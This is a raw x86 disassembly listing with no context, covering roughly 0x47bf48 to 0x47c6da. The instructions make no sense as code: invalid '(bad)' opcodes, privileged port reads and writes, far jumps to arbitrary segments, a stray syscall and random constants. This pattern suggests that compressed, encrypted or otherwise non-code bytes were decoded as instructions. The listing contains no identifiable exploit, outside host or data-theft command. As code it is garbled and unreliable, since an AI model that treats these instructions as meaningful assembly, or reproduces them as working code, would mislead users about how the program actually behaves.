  47bf48:	and    BYTE PTR fs:[ecx-0x2788f6a6],bl
  47bf4f:	sbb    ch,0x1a
  47bf52:	and    al,0x8c
  47bf54:	adc    DWORD PTR [ebp+0x10],edi
  47bf57:	sub    DWORD PTR [eax],edi
  47bf59:	in     al,dx
  47bf5a:	nop
  47bf5b:	fst    DWORD PTR [edi+0x6d]
  47bf5e:	push   edi
  47bf5f:	cwde   
  47bf60:	imul   ecx,DWORD PTR [ebx],0xffffffa4
  47bf63:	dec    ebp
  47bf64:	imul   ebp,DWORD PTR [esi+0xd],0xf1c06862
  47bf6b:	out    0x58,al
  47bf6d:	test   al,0xed
  47bf6f:	inc    DWORD PTR [ebx+0x50]
  47bf72:	sbb    DWORD PTR [eax],esi
  47bf74:	lea    eax,[ebx+0x43]
  47bf77:	mov    BYTE PTR [ecx+0x1b],cl
  47bf7a:	push   esp
  47bf7b:	adc    dl,BYTE PTR [edi-0xc529b50]
  47bf81:	dec    ebp
  47bf82:	cmp    ebp,DWORD PTR [edx+0x0]
  47bf85:	mov    ch,0xa8
  47bf87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  47bf88:	add    DWORD PTR [ecx],edx
  47bf8a:	jl     0x47bfee
  47bf8c:	and    eax,0x1f26903f
  47bf91:	fisubr DWORD PTR [edx+0x38]
  47bf94:	leave  
  47bf95:	mov    al,ds:0x768bcf8b
  47bf9a:	syscall 
  47bf9c:	and    al,0x79
  47bf9e:	dec    ebx
  47bf9f:	into   
  47bfa0:	in     al,0x50
  47bfa2:	jp     0x47c00d
  47bfa4:	cmp    al,0x1e
  47bfa6:	mov    BYTE PTR [esi+edx*2],al
  47bfa9:	popa   
  47bfaa:	popa   
  47bfab:	mov    dh,0x95
  47bfad:	lea    ebx,[ebx-0x10bea905]
  47bfb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  47bfb4:	js     0x47bfdb
  47bfb6:	add    eax,DWORD PTR [edi-0x7a169303]
  47bfbc:	xor    al,0x2f
  47bfbe:	leave  
  47bfbf:	mov    al,ds:0xd6d1a5a3
  47bfc4:	xchg   DWORD PTR [edi],esi
  47bfc6:	and    esi,DWORD PTR [ecx+0x37621086]
  47bfcc:	daa    
  47bfcd:	or     BYTE PTR [esp+eiz*8],bl
  47bfd0:	daa    
  47bfd1:	jmp    0xf808:0x507bda70
  47bfd8:	fs arpl si,ax
  47bfdb:	gs pop es
  47bfdd:	imul   ecx,DWORD PTR [esi],0xe3a39485
  47bfe3:	ja     0x47bfbf
  47bfe5:	rcl    BYTE PTR [eax],0xe
  47bfe8:	or     ebp,DWORD PTR [ecx]
  47bfea:	jmp    FWORD PTR [ecx+edi*4]
  47bfed:	push   es
  47bfee:	fld    TBYTE PTR [ecx-0x70b416c8]
  47bff4:	and    al,0x3e
  47bff6:	or     BYTE PTR [edi+0x57],bl
  47bff9:	not    BYTE PTR [esi-0x60]
  47bffc:	add    eax,ebx
  47bffe:	or     bh,bh
  47c000:	sbb    DWORD PTR [edi],edx
  47c002:	stc    
  47c003:	lock xor DWORD PTR [esp+edx*1+0x5f],esp
  47c008:	push   eax
  47c009:	lock fimul DWORD PTR [ebx+0x1b0c51c1]
  47c010:	sub    BYTE PTR [edi+edx*1+0x21190309],bl
  47c017:	adc    eax,0x78184b21
  47c01c:	adc    eax,0xa2f1fb4c
  47c021:	cmp    BYTE PTR [ebx],cl
  47c023:	cmp    al,0xc9
  47c025:	cmp    BYTE PTR [edi+0x1daadb3c],ch
  47c02b:	rcl    ch,cl
  47c02d:	popa   
  47c02e:	pusha  
  47c02f:	(bad)  
  47c030:	bndldx (bad),[ecx+0x53]
  47c034:	inc    edi
  47c035:	int    0x84
  47c037:	imul   edx,DWORD PTR ds:0x9212658f,0xffffffa7
  47c03e:	jge    0x47c098
  47c040:	adc    BYTE PTR [edi+0x299ced72],bh
  47c046:	inc    edi
  47c047:	add    eax,0xe5a47d00
  47c04c:	js     0x47bfce
  47c04e:	pop    eax
  47c04f:	in     al,dx
  47c050:	pop    es
  47c051:	inc    esi
  47c052:	loope  0x47c083
  47c054:	call   0x48b43399
  47c059:	mov    al,ds:0x286ab600
  47c05e:	std    
  47c05f:	push   edi
  47c061:	shl    BYTE PTR [edx],1
  47c063:	inc    ebx
  47c064:	or     BYTE PTR [edx-0x2fc5f7ad],cl
  47c06a:	je     0x47c0a3
  47c06c:	mov    eax,ds:0xb790d698
  47c071:	mov    ecx,0xa1e0713b
  47c076:	pushf  
  47c077:	pop    ss
  47c078:	aad    0x1c
  47c07a:	mov    al,ds:0x369b03a9
  47c07f:	jne    0x47c009
  47c081:	add    al,0x89
  47c083:	add    dh,0x6c
  47c086:	jmp    0x40cd3fd9
  47c08b:	shl    DWORD PTR [edi*1+0x25263f04],cl
  47c092:	jecxz  0x47c066
  47c094:	add    eax,edx
  47c096:	aam    0xbf
  47c098:	retf   0x418
  47c09b:	jle    0x47c0c7
  47c09d:	ret    
  47c09e:	xor    edx,ecx
  47c0a0:	add    al,0x80
  47c0a2:	arpl   WORD PTR [eax],cx
  47c0a4:	dec    BYTE PTR [edx+ecx*1-0x7f8380f0]
  47c0ab:	dec    ebx
  47c0ac:	or     BYTE PTR [ecx],al
  47c0ae:	mov    al,ds:0x8ed2c68d
  47c0b3:	iret   
  47c0b4:	push   bp
  47c0b6:	lock scas eax,DWORD PTR es:[edi]
  47c0b8:	adc    esp,DWORD PTR [eax-0x20]
  47c0bb:	out    dx,eax
  47c0bc:	push   eax
  47c0be:	mov    bl,BYTE PTR [esi+0x8]
  47c0c1:	not    ebx
  47c0c3:	and    bl,BYTE PTR [esp]
  47c0c6:	mov    al,ds:0xc33afacc
  47c0cb:	je     0x47c120
  47c0cd:	(bad)  
  47c0ce:	pushf  
  47c0cf:	push   ss
  47c0d0:	shl    BYTE PTR ds:[ebx+edx*1],0x83
  47c0d5:	retf   0xaa02
  47c0d8:	mov    ebx,DWORD PTR [ebp+esi*2-0x36]
  47c0dc:	add    al,0x71
  47c0de:	add    eax,0xb4c96d1e
  47c0e3:	sbb    eax,0x6ba20250
  47c0e8:	inc    ecx
  47c0e9:	call   0xcd04:0x16f4ad27
  47c0f0:	and    BYTE PTR [eax],cl
  47c0f2:	retf   0xc020
  47c0f5:	ficom  DWORD PTR [eax+0xa]
  47c0f8:	mov    edx,0x188d0488
  47c0fd:	jl     0x47c08f
  47c0ff:	(bad)  
  47c101:	xor    dh,BYTE PTR [edi+edi*8]
  47c104:	push   ebx
  47c105:	xor    BYTE PTR [esi],cl
  47c107:	cmp    ch,BYTE PTR [eax]
  47c109:	jne    0x47c156
  47c10b:	imul   edi,edi,0xc
  47c10e:	add    BYTE PTR [ecx],bl
  47c110:	add    eax,DWORD PTR fs:[esi]
  47c113:	mov    ebp,0x40e3e004
  47c118:	sahf   
  47c119:	pop    ebx
  47c11a:	push   edi
  47c11b:	adc    dl,al
  47c11d:	adc    cl,cl
  47c11f:	xor    ebx,esi
  47c121:	adc    al,0xf4
  47c123:	sbb    BYTE PTR [eax],ch
  47c125:	pop    edi
  47c126:	sbb    BYTE PTR [ebp-0x54],ch
  47c129:	pop    ebx
  47c12a:	cmp    BYTE PTR [ecx],0x25
  47c12d:	dec    eax
  47c12e:	sbb    edi,DWORD PTR [ebx+0x14]
  47c131:	test   al,0xc0
  47c133:	outs   dx,BYTE PTR ds:[esi]
  47c134:	and    eax,ebp
  47c136:	ror    BYTE PTR [eax+0x24],1
  47c139:	and    DWORD PTR [ebx+0x6a13b0d9],eax
  47c13f:	add    dl,BYTE PTR ds:0xa447a4f8
  47c145:	and    eax,0x4b8014d7
  47c14a:	add    DWORD PTR [ecx-0x4f],esi
  47c14d:	pop    eax
  47c14e:	pop    ds
  47c14f:	psadbw mm1,QWORD PTR [esi-0x2cbec8c]
  47c156:	retf   
  47c157:	retf   
  47c158:	mov    eax,ds:0x3eeffb45
  47c15d:	add    al,0xc9
  47c15f:	xchg   edi,eax
  47c160:	or     esp,esp
  47c162:	sti    
  47c163:	mov    eax,ds:0xa1f70898
  47c168:	pushf  
  47c169:	and    BYTE PTR [edi],bl
  47c16b:	sbb    DWORD PTR [eax-0x19],ebx
  47c16e:	add    al,0xb3
  47c170:	inc    edx
  47c171:	fisub  WORD PTR [eax+eiz*2+0x17]
  47c175:	test   al,0xb2
  47c177:	inc    ebx
  47c178:	imul   edi,DWORD PTR [edi-0x318f3b8e],0xa190c344
  47c182:	aam    0x17
  47c184:	enter  0x1e49,0x6a
  47c188:	pop    es
  47c189:	ret    0x41de
  47c18c:	xor    al,0x70
  47c18e:	cmp    DWORD PTR [ebp+eiz*1+0xf],0xc9411d58
  47c196:	fiadd  WORD PTR [ecx-0x40]
  47c199:	dec    edx
  47c19a:	add    al,0x22
  47c19c:	bswap  ecx
  47c19e:	push   edi
  47c19f:	xchg   esi,eax
  47c1a0:	push   esi
  47c1a1:	xchg   ebp,eax
  47c1a2:	sub    ch,BYTE PTR [eax-0x21]
  47c1a5:	inc    ecx
  47c1a6:	inc    edx
  47c1a7:	stos   DWORD PTR es:[edi],eax
  47c1a8:	dec    ecx
  47c1a9:	or     eax,0xa7d46b53
  47c1ae:	mov    al,ds:0xefbd056f
  47c1b3:	push   ecx
  47c1b4:	in     al,0x9a
  47c1b6:	je     0x47c1c8
  47c1b8:	cld    
  47c1b9:	das    
  47c1ba:	lea    eax,[ebp+0x426f590e]
  47c1c0:	in     al,0xdb
  47c1c2:	sub    BYTE PTR [eax+0x37e5b580],bh
  47c1c8:	sub    BYTE PTR [ebp-0x31ec2d22],ch
  47c1ce:	pop    ss
  47c1cf:	push   ebp
  47c1d0:	pop    ecx
  47c1d1:	retf   0x6fee
  47c1d4:	jmp    0xc81f:0x38563781
  47c1db:	in     eax,dx
  47c1dc:	add    esi,ecx
  47c1de:	enter  0x1897,0xcf
  47c1e2:	add    ebx,DWORD PTR [eax-0xb82d934]
  47c1e8:	fld    DWORD PTR [edi+0x30869fb4]
  47c1ee:	ja     0x47c1a8
  47c1f0:	adc    ch,al
  47c1f2:	in     al,0xe9
  47c1f4:	inc    ebx
  47c1f5:	ds pop eax
  47c1f7:	pusha  
  47c1f8:	shl    al,cl
  47c1fa:	int3   
  47c1fb:	push   eax
  47c1fc:	push   0x61
  47c1fe:	or     bh,BYTE PTR [esi+0x503b4818]
  47c204:	test   BYTE PTR [eax+ebx*1-0x337fc5ae],ch
  47c20b:	push   ds
  47c20c:	add    dh,bh
  47c20e:	sbb    edi,0xa01f5e27
  47c214:	in     al,0x62
  47c216:	test   DWORD PTR [ecx-0x40],ebx
  47c219:	inc    ebx
  47c21a:	mov    edx,0xf5a3036c
  47c21f:	fwait
  47c220:	inc    ecx
  47c221:	call   0xec70:0x696de5c4
  47c228:	mov    al,0xb9
  47c22a:	mov    ebx,0x5959ed20
  47c22f:	mov    cl,0x48
  47c231:	bound  eax,QWORD PTR [edi+0x58]
  47c234:	jo     0x47c257
  47c236:	clc    
  47c237:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  47c238:	pop    esp
  47c239:	add    BYTE PTR [ecx-0x1744b0ab],dh
  47c23f:	sbb    DWORD PTR [ebp-0x27381780],edi
  47c245:	sbb    al,0xf0
  47c247:	in     al,0x3d
  47c249:	ins    DWORD PTR es:[edi],dx
  47c24a:	mov    DWORD PTR [edi],esp
  47c24c:	lock push 0xd0d426a2
  47c252:	adc    BYTE PTR [edi+0x27ed9cd],dh
  47c258:	push   ebp
  47c259:	out    dx,eax
  47c25a:	pop    ds
  47c25b:	in     al,0xfb
  47c25d:	xor    eax,0x44ede2f6
  47c262:	or     dl,BYTE PTR [ebx-0x6f]
  47c265:	ret    0x560a
  47c268:	(bad)  
  47c269:	cli    
  47c26a:	xchg   esi,eax
  47c26b:	and    ebx,DWORD PTR [eax]
  47c26d:	adc    ebx,ecx
  47c26f:	inc    edi
  47c270:	push   esi
  47c271:	add    cx,bx
  47c274:	cdq    
  47c275:	aam    0x11
  47c277:	outs   dx,DWORD PTR ds:[esi]
  47c278:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  47c279:	fisubr DWORD PTR ds:0xeaa7f6dd
  47c27f:	pop    ss
  47c280:	sar    edx,0x12
  47c283:	pusha  
  47c284:	or     al,0xb6
  47c286:	add    esi,DWORD PTR [esi+eax*1+0x65]
  47c28a:	ins    DWORD PTR es:[edi],dx
  47c28b:	push   es
  47c28c:	jo     0x47c298
  47c28e:	cmp    BYTE PTR [ebx+0xc7b7cc8],cl
  47c294:	ins    DWORD PTR es:[edi],dx
  47c295:	pop    ebp
  47c296:	shl    eax,cl
  47c298:	js     0x47c2e3
  47c29a:	div    DWORD PTR [eax]
  47c29c:	shl    edi,0xd1
  47c29f:	and    eax,ecx
  47c2a1:	xchg   BYTE PTR [ecx+0x79f413f],al
  47c2a7:	rcl    DWORD PTR [esi+0x40250674],0x97
  47c2ae:	fadd   QWORD PTR [edi]
  47c2b0:	inc    eax
  47c2b1:	lds    edx,FWORD PTR [eax]
  47c2b3:	mov    esi,0x1ea0575d
  47c2b8:	add    BYTE PTR [eax-0x5f],ah
  47c2bb:	mov    eax,es
  47c2bd:	cmp    dl,dl
  47c2bf:	push   ds
  47c2c0:	inc    ecx
  47c2c1:	inc    ebp
  47c2c2:	or     al,0xb1
  47c2c4:	jp     0x47c323
  47c2c6:	sub    al,0x10
  47c2c8:	test   al,0x86
  47c2ca:	sub    DWORD PTR [esi-0x4d],ecx
  47c2cd:	jne    0x47c2f7
  47c2cf:	lahf   
  47c2d0:	add    eax,0x87028b24
  47c2d5:	jae    0x47c31a
  47c2d7:	out    dx,al
  47c2d8:	add    edi,ecx
  47c2da:	jo     0x47c341
  47c2dc:	test   BYTE PTR [ebx+0x109170ec],al
  47c2e2:	push   ds
  47c2e3:	stc    
  47c2e4:	jmp    0x47c2c7
  47c2e6:	mov    edx,0xef1b1a0
  47c2eb:	xor    edi,DWORD PTR [eax-0x3c55ffd7]
  47c2f1:	cwde   
  47c2f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  47c2f3:	imul   ebp,DWORD PTR [edx+0xc08280d],0x1b0d0eec
  47c2fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  47c2fe:	sub    al,0x69
  47c300:	(bad)  
  47c301:	push   edi
  47c302:	and    ebp,DWORD PTR [esi]
  47c304:	xor    al,0xf3
  47c306:	nop
  47c307:	mov    al,ds:0x1ed1e39f
  47c30c:	adc    DWORD PTR [ecx],eax
  47c30e:	clc    
  47c30f:	adc    ch,BYTE PTR [ebx]
  47c311:	xchg   edi,eax
  47c312:	mov    BYTE PTR ds:0xdca68e93,al
  47c318:	cmp    esp,DWORD PTR [eax]
  47c31a:	js     0x47c2ce
  47c31c:	mov    bl,0xbf
  47c31e:	cwde   
  47c31f:	jecxz  0x47c377
  47c321:	push   ebx
  47c322:	jge    0x47c2ef
  47c324:	pusha  
  47c325:	xor    al,0xb9
  47c327:	lock daa 
  47c329:	or     bl,BYTE PTR [edx+0x7b]
  47c32c:	sub    ah,0x37
  47c32f:	push   ecx
  47c330:	push   cs
  47c331:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  47c332:	sbb    bl,ah
  47c334:	and    esi,DWORD PTR [ebx+0x224746d5]
  47c33a:	fadd   QWORD PTR [esi+0x6a]
  47c33d:	jmp    FWORD PTR [ecx]
  47c33f:	lock ins BYTE PTR es:[edi],dx
  47c341:	ins    DWORD PTR es:[edi],dx
  47c342:	mov    ebx,0x26eb4d63
  47c347:	jns    0x47c374
  47c349:	pop    ss
  47c34a:	or     eax,0xb831f060
  47c34f:	dec    ecx
  47c350:	add    ah,BYTE PTR [ebx]
  47c352:	jae    0x47c3ac
  47c354:	mov    edx,0xf0391a8d
  47c359:	push   0xee1ada11
  47c35e:	sub    BYTE PTR [ebx],al
  47c360:	inc    esp
  47c361:	inc    edx
  47c362:	das    
  47c363:	inc    ebx
  47c364:	push   eax
  47c365:	daa    
  47c366:	or     ebp,DWORD PTR [eax]
  47c368:	add    al,0x75
  47c36a:	fs mov cl,0x6f
  47c36d:	jle    0x47c39a
  47c36f:	sbb    BYTE PTR [ebx],0x57
  47c372:	lock loopne 0x47c3dd
  47c375:	mov    BYTE PTR [eax],0x88
  47c378:	mov    ecx,0x61ab77b4
  47c37d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  47c37e:	mov    DWORD PTR [esi+0x0],0x2aab0066
  47c385:	repz dec eax
  47c387:	mov    al,0x49
  47c389:	out    0xd1,eax
  47c38b:	mov    ah,0x80
  47c38d:	in     al,dx
  47c38e:	sub    al,0xac
  47c390:	leave  
  47c391:	push   ecx
  47c392:	and    al,0x69
  47c394:	js     0x47c36d
  47c396:	pop    esp
  47c397:	call   0xc87539f
  47c39c:	mov    cl,BYTE PTR [edi+0x3d]
  47c39f:	punpckhdq mm0,QWORD PTR [eax]
  47c3a2:	ret    0xa2ba
  47c3a5:	aaa    
  47c3a6:	adc    DWORD PTR [ebx-0x29642e26],ecx
  47c3ac:	xor    DWORD PTR [ebx+0x5df80f28],ecx
  47c3b2:	adc    BYTE PTR [eax+0x10],bh
  47c3b5:	jmp    0x47c3f3
  47c3b7:	mov    edx,0x6f0aff03
  47c3bc:	fcomp  QWORD PTR [eax]
  47c3be:	lea    eax,[eax+edx*4]
  47c3c1:	lea    ecx,[edx+edx*2]
  47c3c4:	sar    esp,cl
  47c3c6:	int    0x41
  47c3c8:	dec    esp
  47c3c9:	or     cl,BYTE PTR [ebx]
  47c3cb:	mov    bl,BYTE PTR [ecx+0x2]
  47c3ce:	mov    BYTE PTR [eax+0x2],bl
  47c3d1:	add    DWORD PTR [ebx+0x37],eax
  47c3d4:	sar    BYTE PTR [edx+0x1],1
  47c3d7:	mov    cl,BYTE PTR [ecx]
  47c3d9:	mov    BYTE PTR [edx+0x3],ch
  47c3dc:	add    BYTE PTR [edx+0x6f],cl
  47c3df:	add    ecx,esi
  47c3e1:	xor    eax,0x1951d792
  47c3e6:	iret   
  47c3e7:	add    BYTE PTR [edi-0x35],cl
  47c3ea:	or     BYTE PTR [ecx],al
  47c3ec:	xchg   edi,eax
  47c3ed:	mov    edi,DWORD PTR [esi]
  47c3ef:	dec    edi
  47c3f0:	iret   
  47c3f1:	pop    ds
  47c3f2:	sti    
  47c3f3:	or     eax,0xa501b9c2
  47c3f8:	mov    BYTE PTR [ebp+0x148b4914],cl
  47c3fe:	sub    DWORD PTR [ecx-0x66],0xffffffe6
  47c402:	adc    ecx,DWORD PTR [edx+0x5a585a58]
  47c408:	jl     0x47c3c0
  47c40a:	sti    
  47c40b:	add    DWORD PTR [edi+0x2],edi
  47c40e:	inc    ecx
  47c40f:	dec    edi
  47c410:	jne    0x47c3ee
  47c412:	cmp    DWORD PTR [esi],0xb8227d1e
  47c418:	or     eax,0x14a062b
  47c41d:	pop    ebx
  47c41e:	ror    DWORD PTR [esi+edx*1],cl
  47c421:	or     BYTE PTR [esp+ecx*1],al
  47c424:	pusha  
  47c425:	add    al,0x1
  47c427:	es out dx,al
  47c429:	into   
  47c42a:	push   0x3806c795
  47c42f:	fisub  WORD PTR [eax+0x771d350e]
  47c435:	aam    0xcd
  47c437:	hlt    
  47c438:	mov    BYTE PTR ds:0x50161256,0x88
  47c43f:	test   al,0xaa
  47c441:	ret    0xbcdd
  47c444:	dec    ecx
  47c445:	js     0x47c47a
  47c447:	and    al,BYTE PTR [esi+0x20]
  47c44a:	cmp    al,0x10
  47c44c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  47c44d:	cmc    
  47c44e:	in     eax,dx
  47c44f:	das    
  47c450:	and    BYTE PTR [edx-0x173e37f1],cl
  47c456:	or     BYTE PTR [ecx-0xd86b6f2],cl
  47c45c:	jmp    0x47c477
  47c45e:	jp     0x47c45f
  47c460:	mul    bh
  47c462:	pop    eax
  47c463:	and    al,0x88
  47c465:	(bad)  
  47c466:	mov    bl,ah
  47c468:	sub    BYTE PTR [eax],dl
  47c46a:	shl    ebx,0x8
  47c46d:	mov    bl,al
  47c46f:	mov    DWORD PTR [edx+esi*1],ebx
  47c472:	jmp    0xd3fceb2b
  47c477:	scas   eax,DWORD PTR es:[edi]
  47c478:	lahf   
  47c479:	clc    
  47c47a:	xchg   esp,eax
  47c47b:	into   
  47c47c:	(bad)  
  47c47e:	mov    WORD PTR [ebp+0x1003000f],0x6cfa
  47c487:	cmp    BYTE PTR [esi-0x36acbbb],0xe
  47c48e:	mov    ecx,0x47c9c940
  47c493:	(bad)  
  47c494:	push   es
  47c495:	or     edi,edi
  47c497:	mov    ebp,0x370807e5
  47c49c:	loopne 0x47c508
  47c49e:	push   0xf84889
  47c4a3:	test   DWORD PTR [eax-0x73f0ef20],0x127b36ce
  47c4ad:	cli    
  47c4ae:	xor    BYTE PTR [ebx+0x2e],dl
  47c4b1:	or     BYTE PTR ds:0x18bd8170,bh
  47c4b7:	into   
  47c4b8:	dec    esp
  47c4b9:	xchg   esp,eax
  47c4ba:	lods   al,BYTE PTR ds:[esi]
  47c4bb:	sbb    al,al
  47c4bd:	add    BYTE PTR [edx+0x3e],ch
  47c4c0:	push   ss
  47c4c1:	cmp    al,0x1e
  47c4c3:	push   0xe8503ee0
  47c4c8:	lahf   
  47c4c9:	inc    ecx
  47c4ca:	jp     0x47c4cb
  47c4cc:	fiadd  WORD PTR [edi+0xf]
  47c4cf:	mov    bh,0xfd
  47c4d1:	lea    eax,[ebp+eax*4-0x2dd38020]
  47c4d8:	(bad)  
  47c4d9:	push   esi
  47c4da:	push   esi
  47c4db:	pop    es
  47c4dc:	push   ebx
  47c4dd:	cmp    ebp,DWORD PTR [edx+0x1c]
  47c4e0:	cs imul ebx,ecx,0xeb27c7b4
  47c4e7:	push   ds
  47c4e8:	addr16 fsubr st(7),st
  47c4eb:	data16 or dl,dh
  47c4ee:	sbb    al,0x6
  47c4f0:	and    al,0xf7
  47c4f2:	(bad)  
  47c4f3:	in     eax,0xfc
  47c4f5:	xchg   BYTE PTR [edi],bl
  47c4f7:	pop    es
  47c4f8:	pop    ss
  47c4f9:	(bad)  
  47c4fa:	icebp  
  47c4fb:	jno    0x47c4dd
  47c4fd:	das    
  47c4fe:	rcl    DWORD PTR [edx],cl
  47c500:	cmp    al,0xb5
  47c502:	scas   al,BYTE PTR es:[edi]
  47c503:	sahf   
  47c504:	lock xor al,0xc2
  47c507:	pop    edx
  47c508:	stos   BYTE PTR es:[edi],al
  47c509:	inc    eax
  47c50a:	mov    BYTE PTR [edi+0x61],dh
  47c50d:	repnz push eax
  47c50f:	mov    DWORD PTR [ebx],0xe65ec0f8
  47c515:	fsub   DWORD PTR ds:0xf803d220
  47c51b:	cmp    BYTE PTR [edi+ebp*1-0x45],bh
  47c51f:	cmp    dl,BYTE PTR [eax]
  47c521:	mov    dh,ch
  47c523:	icebp  
  47c524:	dec    edi
  47c525:	das    
  47c526:	outs   dx,DWORD PTR ds:[esi]
  47c527:	dec    ecx
  47c528:	in     eax,0xff
  47c52a:	pop    eax
  47c52b:	movzx  eax,WORD PTR [ebx+0x2]
  47c52f:	lea    eax,[ebx+eax*4-0x1c]
  47c533:	or     BYTE PTR [esi+0x79524201],bh
  47c539:	add    al,0x41
  47c53b:	gs out 0xf8,al
  47c53e:	sbb    BYTE PTR [ebx],dh
  47c540:	lods   al,BYTE PTR ds:[esi]
  47c541:	xor    eax,0x42c5f7da
  47c546:	shr    BYTE PTR [ecx+0x52dafc5e],0xe8
  47c54d:	xchg   esi,eax
  47c54e:	adc    al,0xe
  47c550:	cld    
  47c551:	pop    esi
  47c552:	mov    al,ds:0x82d33138
  47c557:	add    eax,0x53575c1f
  47c55c:	addr16 clc 
  47c55e:	addr16 push esi
  47c560:	jo     0x47c566
  47c562:	or     DWORD PTR [ecx+0x36],ecx
  47c565:	daa    
  47c566:	mov    edx,0x38c04219
  47c56b:	lds    edi,FWORD PTR [edi]
  47c56d:	push   ebx
  47c56e:	and    esp,DWORD PTR [eax-0x2d]
  47c571:	jle    0x47c5be
  47c573:	jmp    0x47c588
  47c575:	es dec esp
  47c577:	mov    eax,edx
  47c579:	aam    0x58
  47c57b:	pop    ss
  47c57c:	outs   dx,BYTE PTR ds:[esi]
  47c57d:	adc    esi,esi
  47c57f:	retf   
  47c580:	clc    
  47c581:	sub    DWORD PTR [ecx-0x39fdedf5],ebp
  47c587:	movups xmm6,XMMWORD PTR [ebp+0x41]
  47c58b:	jae    0x47c590
  47c58d:	sbb    cl,BYTE PTR [ebp+0x1]
  47c590:	aad    0xd4
  47c592:	push   cs
  47c593:	xchg   BYTE PTR [eax+esi*4-0x31],ah
  47c597:	xor    eax,0x22b1024e
  47c59c:	aam    0x64
  47c59e:	xor    BYTE PTR [ebp-0x2e],ah
  47c5a1:	sub    al,0x8d
  47c5a3:	or     eax,0x1204a6a4
  47c5a8:	xchg   ebp,eax
  47c5a9:	ret    
  47c5aa:	pop    edx
  47c5ab:	push   edi
  47c5ac:	je     0x47c52f
  47c5ae:	lock out 0xa9,eax
  47c5b1:	je     0x47c5e9
  47c5b3:	push   esp
  47c5b4:	push   0x4
  47c5b6:	push   ebx
  47c5b7:	xor    DWORD PTR [ecx],ebp
  47c5b9:	retf   0xa900
  47c5bc:	mov    ch,0x31
  47c5be:	and    edi,DWORD PTR [esi]
  47c5c0:	add    eax,0x7025f7ac
  47c5c5:	add    eax,DWORD PTR [edx+0x56]
  47c5c8:	mov    ch,0x9f
  47c5ca:	and    BYTE PTR [eax-0x7f],dh
  47c5cd:	dec    edi
  47c5ce:	pop    eax
  47c5cf:	xchg   ebx,eax
  47c5d0:	mov    BYTE PTR [edi],al
  47c5d2:	add    DWORD PTR [eax-0x3d],edi
  47c5d5:	jmp    0x47c58a
  47c5d7:	sbb    al,0x58
  47c5d9:	pop    es
  47c5da:	scas   eax,DWORD PTR es:[edi]
  47c5db:	pushf  
  47c5dc:	push   ebx
  47c5dd:	inc    eax
  47c5de:	ins    BYTE PTR es:[edi],dx
  47c5df:	inc    esp
  47c5e0:	jl     0x47c5b3
  47c5e2:	push   0xe523f08
  47c5e7:	cmp    DWORD PTR [eax],0xffffff81
  47c5ea:	jo     0x47c613
  47c5ec:	push   edi
  47c5ed:	add    ecx,edx
  47c5ef:	dec    eax
  47c5f0:	mov    ah,0x94
  47c5f2:	loope  0x47c622
  47c5f4:	test   eax,0x314614ef
  47c5fa:	js     0x47c5bb
  47c5fc:	or     DWORD PTR [esi],0x8152d02e
  47c602:	jns    0x47c605
  47c604:	dec    esp
  47c605:	adc    eax,0x1a387437
  47c60a:	jmp    0x2f59c93c
  47c60f:	shr    BYTE PTR [eax],0x39
  47c612:	lods   eax,DWORD PTR ds:[esi]
  47c613:	lock rcl DWORD PTR [ecx+0x757cecbe],1
  47c61a:	cld    
  47c61b:	push   esi
  47c61c:	gs add al,0x1b
  47c61f:	imul   eax,DWORD PTR [ecx-0xfedc989],0x7df4c8b7
  47c629:	dec    edx
  47c62a:	and    eax,0xe837b21d
  47c62f:	push   ebp
  47c630:	push   cs
  47c631:	xchg   DWORD PTR [edx-0x30429006],ebx
  47c637:	or     BYTE PTR [ecx-0x17c152fd],0xb1
  47c63e:	push   es
  47c63f:	push   cs
  47c640:	sub    BYTE PTR [edi+0x2d8163ef],dl
  47c646:	or     esp,eax
  47c648:	add    ebp,ebp
  47c64a:	loop   0x47c651
  47c64c:	pop    es
  47c64d:	or     DWORD PTR [edx-0x5967a7e4],0xffffffd3
  47c654:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  47c655:	leave  
  47c656:	aaa    
  47c657:	(bad)  
  47c658:	pop    ss
  47c659:	mov    DWORD PTR [eax+0x20],0x502413f4
  47c660:	inc    ebx
  47c661:	add    DWORD PTR [ebx-0x7e17d496],eax
  47c667:	mov    cl,0xec
  47c669:	fimul  WORD PTR [edx]
  47c66b:	or     al,0x32
  47c66d:	inc    ebx
  47c66e:	jle    0x47c6e2
  47c670:	sbb    BYTE PTR [edx+esi*8],0x5d
  47c674:	cld    
  47c675:	push   ebx
  47c676:	push   ebx
  47c677:	cli    
  47c678:	pop    eax
  47c679:	inc    eax
  47c67a:	nop
  47c67b:	add    esi,DWORD PTR [ecx+0x11e4ad01]
  47c681:	js     0x47c620
  47c683:	test   DWORD PTR [ecx],eax
  47c685:	jmp    0x8ea4dab4
  47c68a:	cmp    esp,DWORD PTR [ecx]
  47c68c:	lock ja 0x47c689
  47c68f:	mov    al,0x52
  47c691:	sub    al,0x9f
  47c693:	nop
  47c694:	mov    eax,0x8c402ad
  47c699:	push   ds
  47c69a:	fild   QWORD PTR ds:0x9b7808b3
  47c6a0:	outs   dx,BYTE PTR ds:[esi]
  47c6a1:	stos   DWORD PTR es:[edi],eax
  47c6a2:	cdq    
  47c6a3:	(bad)  
  47c6a4:	xor    DWORD PTR [edi-0x742137b4],edx
  47c6aa:	shl    BYTE PTR [esi],0xba
  47c6ad:	pop    edx
  47c6ae:	add    DWORD PTR [edi+0x45a2b08],esp
  47c6b4:	cmp    eax,0xf61fb701
  47c6b9:	movzx  esi,BYTE PTR [esi]
  47c6bc:	sbb    eax,0xeb205ff0
  47c6c1:	pop    edx
  47c6c2:	xchg   DWORD PTR [ebx],edi
  47c6c4:	inc    edx
  47c6c5:	add    al,0xe8
  47c6c7:	shr    DWORD PTR [esi+0x51],0x4b
  47c6cb:	jmp    0x47c666
  47c6cd:	mov    edx,DWORD PTR [eax]
  47c6cf:	(bad)  
  47c6d0:	push   ss
  47c6d1:	popf   
  47c6d2:	data16 scas al,BYTE PTR es:[edi]
  47c6d4:	jmp    DWORD PTR [esi]
  47c6d6:	test   ecx,ecx
  47c6d8:	jle    0x47c6de
  47c6da:	cmp    esi,ecx
